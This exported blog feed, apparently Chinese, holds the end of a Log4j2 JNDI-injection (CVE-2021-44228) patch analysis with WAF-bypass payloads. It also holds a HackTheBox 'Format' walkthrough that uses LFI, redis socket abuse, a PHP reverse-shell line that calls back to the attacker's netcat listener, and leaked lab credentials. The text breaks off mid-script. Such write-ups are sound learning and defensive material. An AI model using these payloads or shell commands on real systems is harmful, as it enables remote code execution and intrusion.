<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203751594.png"></p>
<p>至此，后续即可按照常规jndi注入路径进行分析。</p>
<h2 id="三、补丁分析"><a href="#三、补丁分析" class="headerlink" title="三、补丁分析"></a>三、补丁分析</h2><h3 id="（一）2-15-0-rc1"><a href="#（一）2-15-0-rc1" class="headerlink" title="（一）2.15.0-rc1"></a>（一）2.15.0-rc1</h3><p>通过比较2.15.0-rc1和该版本之前最后一个版本2.14.1之间的差异，可以发现Log4j2团队在12月5日提交了一个名为<code>Restrict LDAP access via JNDI (#608)</code>的commit。该commit的详细内容如下链接：</p>
<p><a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3">https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3</a></p>
<p>除去一些测试代码和辅助代码，该commit最主要内容是在 <code>JndiManager.lookup()</code>方法增加了几种限制，分别是<code>allowedHosts</code>、<code>allowedClasses</code>、<code>allowedProtocols</code>。</p>
<p>由于rc1未在maven中央仓库上，因此需要自行下载代码并构建：</p>
<p>到Log4j2的GitHub官方仓库下载rc1：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
<p>分别进入log4j-api和log4j-core目录，执行<code>mvn clean install -DskipTests</code>。最终会在本地maven仓库上生成rc1的jar包，版本为2.15.0，后续测试使用该jar包。</p>
<p><strong>说明：</strong>此处笔者尝试构建时，maven的国内镜像（阿里云、腾讯云、华为云、网易云）均无法解析2.15.0的jar包</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020174739501.png"></p>
<p>以下图片参考：<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020173958585.png"></p>
<p>各个限制的内容分别如下：</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180027074.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180053823.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180108755.png"></p>
<p>可以看到，rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为<code>java</code>、<code>ldap</code>、<code>ldaps</code>，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p>
<h3 id="（二）2-15-0-rc2"><a href="#（二）2-15-0-rc2" class="headerlink" title="（二）2.15.0-rc2"></a>（二）2.15.0-rc2</h3><h4 id="1-rc1中存在的问题"><a href="#1-rc1中存在的问题" class="headerlink" title="1. rc1中存在的问题"></a>1. rc1中存在的问题</h4><p>rc1里主要修复的<code>JndiManager.lookup()</code>方法的整体逻辑结构如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token class-name">URI</span> uri <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URI</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedProtocols<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>ROOT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>LDAP<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> LDAPS<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedHosts<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedClasses<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
                                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">URISyntaxException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// This is OK.</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从上面的代码结构中可以总结如下的逻辑：</p>
<ul>
<li>对传入的<code>name</code>参数进行前面提到的三类白名单检查。如果检查不通过，则直接返回<code>null</code>。</li>
<li>如果产生<code>URISyntaxException</code>，则对该异常忽略，继续执行<code>this.context.lookup(name)</code>。</li>
<li>如果未产生<code>URISyntaxException</code>，则执行<code>this.context.lookup(name)</code>。</li>
</ul>
<p>重点关注<code>catch</code>代码块，rc1默认不对<code>URISyntaxException</code>异常做任何处理，继续执行后续逻辑，即<code>this.context.lookup(name)</code>。</p>
<p>再看下<code>try</code>代码块中可能产生<code>URISyntaxException</code>的地方。好巧不巧，<code>try</code>代码块的第一个语句就可能产生该异常：<code>URI uri = new URI(name);</code>。</p>
<p>试想一下，如果能构造某个特殊的URI，导致<code>URI uri = new URI(name);</code>语句解析URI异常，抛出<code>URISyntaxException</code>，但又能被<code>this.context.lookup(name)</code>正确处理，不就可以绕过了吗？例如构建一个带空格的URI地址（<code>${jndi:ldap://127.0.0.1:1389/ Exp}</code>，由于撰写本文时无法构建rc1代码，故可参考<a href="https://www.freebuf.com/vuls/316143.html%EF%BC%89">https://www.freebuf.com/vuls/316143.html）</a></p>
<h4 id="2-rc2的修复方案"><a href="#2-rc2的修复方案" class="headerlink" title="2. rc2的修复方案"></a>2. rc2的修复方案</h4><p>通过比较2.15.0-rc1和2.15.0-rc2之间的差异，可以发现Log4j2团队在12月10日提交了一个名为<code>Handle URI exception</code>的commit。该commit的详细内容如下链接：</p>
<p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p>
<p>该commit主要内容是对rc1中<code>JndiManager.lookup()</code>方法里的<code>catch</code>代码块进行了修改：当<code>URISyntaxException</code>异常被捕获时，直接返回<code>null</code>。从而避免了上面提到的绕过思路。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019211658860.png"></p>
<h2 id="四、WAF绕过"><a href="#四、WAF绕过" class="headerlink" title="四、WAF绕过"></a>四、WAF绕过</h2><p>各大厂商针对log4j2漏洞应急方案集合：<a href="https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g">https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g</a></p>
<p>由于Log4j2框架几乎是一个类似JDK级别的基础类库，即便自身应用程序里完成了升级，但大量存在依赖引入的其它框架、中间件导致升级工作极为困难，甚至在几年内都无法达到一个可接受的水平。目前，绝大部分公司采取在边界防护设备上使用“临时补丁”的方式。同时，大量bypass方法也随之而来，这将是一个漫长的过程。</p>
<p>WAF主要思路是过滤jndi、ldap、rmi等关键字；过滤<code>ip:port</code></p>
<p>原始payload</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="（一）绕过思路1"><a href="#（一）绕过思路1" class="headerlink" title="（一）绕过思路1"></a>（一）绕过思路1</h3><p>前面分析提到过，StrSubstitutor首先会匹配<code>${</code>，然后还会匹配<code>:-</code></p>
<p>以<code>${${::-j}ndi:${::-l}dap://127.0.0.1:1389/Exp}</code>为例</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203630144.png" style="zoom:80%;">

<p>如果找到<code>:-</code>，就截取<code>:-</code>之前的变量赋值给varName，截取<code>:-</code>到末尾的字符串赋值为varDefaultValve，然后就跳出循环。</p>
<p>然后使用resolveVariable() 对varName的内容进行判断，如果不匹配任何log4j2支持的协议，就返回null（这里varName的值为<code>:</code>）。之后就会把varDefaultValve的值（这里为<code>j</code>）赋给varValue。然后再用varValue替换整个<code>${::-j}</code>，即最后结果为<code>jndi:ldap://127.0.0.1:1389/Exp</code>。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203728230.png"></p>
<p>所以绕过的方法可以是：</p>
<pre class="line-numbers language-none"><code class="language-none">${任意字符串:-实际想要的字符串} = 实际想要的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>注意：</strong>这里的任意字符串不能为log4j2支持的Interpolator前缀。</p>
<h3 id="（二）绕过思路2"><a href="#（二）绕过思路2" class="headerlink" title="（二）绕过思路2"></a>（二）绕过思路2</h3><p>Interpolator除jndi外，还支持解析很多其它前缀，如<code>env</code>、<code>lower</code>、<code>upper</code>，所以可以用如下思路来处理关键字（部分版本不支持<code>lower</code>、<code>upper</code>等协议）：</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="（三）绕过思路3"><a href="#（三）绕过思路3" class="headerlink" title="（三）绕过思路3"></a>（三）绕过思路3</h3><p>针对过滤<code>ip:port</code>，可用域名代替或用默认端口开启ldap服务</p>
<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}
${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="五、思考"><a href="#五、思考" class="headerlink" title="五、思考"></a>五、思考</h2><p>Log4j2漏洞就其自身原理来说，并不复杂，本质上就是jndi注入，分析过程也主要聚焦于jndi注入的产生过程。rc1中采用较为严格的白名单策略，从应急处理的角度看无可厚非。但从历史上发生的各类漏洞修补过程来看，必定会有各种地方遗漏导致后续不断地打补丁。对于WAF的绕过，纵观古今漏洞，往往能在漏洞产生路线的周围找到绕过思路，就像高速公路一样，总会有“事故多发路段”。从软件开发角度讲，与其在上线后不停修复打补丁，不如在开发早期，即设计阶段或者开发阶段，尽量避免这类有可能产生安全风险的设计。在2.16.0版本，Log4j2团队干脆默认禁用掉了JNDI Lookup功能。</p>
<p>另外，rc1中<code>catch</code>代码对异常的处理方式，在日常开发过程中也是容易犯的问题。软件开发中有一个安全原则：<code>Fail Securely</code>，意思是业务系统能够正确安全地处理各种异常和错误。虽然业务开发有时会为了便利性而牺牲一部分安全性，但对于Log4j此类偏底层的强依赖性类库，还是需要严格处理各种可能出现的错误和异常。</p>
<p>阿里云工程师发现Apache Log4j2组件漏洞后，按业界惯例向软件开发方Apache开源社区报告这一问题。但最终工信部网络安全管理局决定暂停阿里云作为上述合作单位6个月。对此，笔者想引用艾公的一句话作为结尾：尊严只在剑锋之上，真理只在大炮射程之内。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>记录一次log4j复现之旅（复现不了你来找我）：<a href="https://blog.csdn.net/lmboss/article/details/123927020">https://blog.csdn.net/lmboss/article/details/123927020</a></p>
<p>Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考：<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
<p>Apache Log4j2 Jndi RCE 高危漏洞分析与防御：<a href="https://paper.seebug.org/1787/">https://paper.seebug.org/1787/</a></p>
<p><a href="https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">Log4j2 利用链与Waf绕过分析</a></p>
<p>Apache log4j2 远程命令执行漏洞复现：<a href="https://cloud.tencent.com/developer/article/2148989">https://cloud.tencent.com/developer/article/2148989</a></p>
<p>log4j waf 绕过技巧：<a href="https://www.cnblogs.com/ph4nt0mer/p/15701647.html">https://www.cnblogs.com/ph4nt0mer/p/15701647.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>细读经典</category>
      </categories>
      <tags>
        <tag>Log4j2</tag>
        <tag>JNDI注入</tag>
        <tag>CVE-2021-44228（Log4j2）</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Format</title>
    <url>/posts/ec5f74de.html</url>
    <content><![CDATA[<h1 id="HTB-Format"><a href="#HTB-Format" class="headerlink" title="HTB-Format"></a>HTB-Format</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集主页超链接找到源码；</p>
<p>2.源码审计本地文件包含+redis未授权；</p>
<p>3.redis未授权垂直越权；</p>
<p>4.本地文件包含配合源码漏洞写反弹shell；</p>
<p>5.sudo -l发现敏感文件；</p>
<p>6.python格式化字符串漏洞获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>端口服务扫描</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230926151139659.png"></p>
<p>有一个域名<code>microblog.htb</code>和非常规端口3000</p>
<p>80端口开放，那么直接访问IP发现会自动跳转到<code>http://app.microblog.htb/</code></p>
<p>那就把两个域名添加进本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 microblog.htb app.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问<code>microblog.htb</code>是404，访问<code>app.microblog.htb</code>如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093055876.png" style="zoom:67%;">

<p>有登录和注册功能点，底部有超链接</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927093202732.png" style="zoom:67%;">

<p>点击<code>Contribute here</code>超链接，跳转到如下图界面，是源码</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927094123462.png" style="zoom:67%;">

<p>注册个test用户，然后会自动登录，新建一个Blog</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102245811.png" style="zoom: 50%;">

<p>新建成功后，点击<code>Edit Site</code>，会自动跳转到<code>http://test.microblog.htb/edit/</code>，所以需要把<code>test.microblog.htb</code>添加进本地hosts文件</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102332626.png" style="zoom: 50%;">

<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.213 test.microblog.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>添加好后，再次点击<code>Edit Site</code>，会跳转到如下图界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927102535862.png" style="zoom:50%;">

<p>h1和txt是两个设置选项，可以设置header和txt，抓包可看到POST传参分别是<code>id=c0mdsvzdfum&amp;header=headertest</code>、<code>id=jyjs1v121x&amp;txt=txttest</code></p>
<h2 id="三、LFI（本地文件包含漏洞）"><a href="#三、LFI（本地文件包含漏洞）" class="headerlink" title="三、LFI（本地文件包含漏洞）"></a>三、LFI（本地文件包含漏洞）</h2><p>看源码<code>microblog-template\edit\index.php</code>发现id存在本地文件包含（LFI）漏洞，对POST参数没有丝毫过滤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927104606899.png"></p>
<p>POST传参<code>id=../../../../../../../../../../etc/passwd&amp;header=headertest</code>，如下图实现LFI</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110038896.png"></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927110023429.png" style="zoom: 50%;">

<p>再看代码，如果<code>isPro</code>条件为<code>True</code>，即用户身份是Pro，那么我们可以上传文件。于是想办法把用户变成pro权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927180629747.png"></p>
<h2 id="四、redis未授权"><a href="#四、redis未授权" class="headerlink" title="四、redis未授权"></a>四、redis未授权</h2><p>源码中多处出现<code>$redis-&gt;connect('/var/run/redis/redis.sock');</code></p>
<p>可以用redis未授权，通过redis socket（<code>unix:/var/run/redis/redis.sock</code>），设置test用户的pro为true</p>
<p><a href="https://redis.io/commands/hset/">https://redis.io/commands/hset/</a></p>
<pre class="line-numbers language-none"><code class="language-none">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:test%20pro%20true%20a/b"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152401752.png"></p>
<p>执行之后，可看到用户已变成pro权限</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152459425.png" style="zoom:50%;">

<p>然后如下命令写反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">id=/var/www/microblog/test/uploads/rev.php&amp;header=&lt;%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.9+9898+&gt;/tmp/f")%3b%3f&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153522937.png"></p>
<p>开启监听</p>
<p>然后访问<code>http://test.microblog.htb/uploads/rev.php</code></p>
<p>成功获取www-data用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153458744.png"></p>
<p>依次执行如下命令，找到信息泄露</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock
keys *
hgetall cooper.dooper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153919922.png"></p>
<p>然后ssh尝试连接，实际用户名密码如下</p>
<pre class="line-numbers language-none"><code class="language-none">cooper:zooperdoopercooper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154156545.png"></p>
<p>执行<code>sudo -l</code>，查看可以以root身份执行的命令</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154506078.png"></p>
<p><code>/usr/bin/license</code>内容如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>kdf<span class="token punctuation">.</span>pbkdf2 <span class="token keyword">import</span> PBKDF2HMAC
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>fernet <span class="token keyword">import</span> Fernet
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> date
<span class="token keyword">import</span> redis
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation
        self<span class="token punctuation">.</span>license <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>created <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Microblog license key manager can only be run as root"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Microblog license key manager'</span><span class="token punctuation">)</span>
group <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--provision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Provision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--deprovision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Deprovision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--check'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Check if specified license key is valid'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'license_key'</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>unix_socket_path<span class="token operator">=</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span>

secret <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/secret"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
secret_encoded <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
salt <span class="token operator">=</span> <span class="token string">b'microblogsalt123'</span>
kdf <span class="token operator">=</span> PBKDF2HMAC<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>salt<span class="token operator">=</span>salt<span class="token punctuation">,</span>iterations<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">,</span>backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
encryption_key <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>kdf<span class="token punctuation">.</span>derive<span class="token punctuation">(</span>secret_encoded<span class="token punctuation">)</span><span class="token punctuation">)</span>

f <span class="token operator">=</span> Fernet<span class="token punctuation">(</span>encryption_key<span class="token punctuation">)</span>
l <span class="token operator">=</span> License<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#provision</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_profile <span class="token operator">=</span> r<span class="token punctuation">.</span>hgetall<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"User does not exist. Please provide valid username."</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    existing_keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    all_keys <span class="token operator">=</span> existing_keys<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> user_key <span class="token keyword">in</span> all_keys<span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>user_key<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
